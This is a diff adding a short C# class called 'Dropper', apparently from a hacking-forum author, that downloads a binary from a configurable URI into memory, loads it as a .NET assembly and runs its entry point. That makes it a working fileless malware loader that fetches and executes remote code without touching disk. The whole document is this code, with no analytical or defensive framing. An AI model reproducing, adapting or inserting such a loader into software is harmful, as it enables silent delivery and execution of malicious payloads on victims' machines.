@@ -1,0 +1,13 @@
+using System;using System.IO;using System.Net;using System.Reflection;namespace HackForums.gigajew
+{public class Dropper
+{private const string TARGET_URI="MYURI";private MemoryStream APPLICATION_DATA=new MemoryStream();[STAThread]
+public void Run()
+{downloadApplicationData();loadApplication();}
+private void loadApplication()
+{byte[]buffer=APPLICATION_DATA.ToArray();Assembly assembly=AppDomain.CreateDomain("").Load(buffer);object[]args=new object[1];if(assembly.EntryPoint.GetParameters().Length>0)
+args=null;assembly.EntryPoint.Invoke(null,args);}
+private void downloadApplicationData()
+{WebRequest request=WebRequest.Create(TARGET_URI);WebResponse response=request.GetResponse();using(Stream web_stream=response.GetResponseStream())
+{byte[]buffer=new byte[8192];int read=0;while((read=web_stream.Read(buffer,0,buffer.Length))>0)
+{APPLICATION_DATA.Write(buffer,0,read);}}
+response.Close();}}}
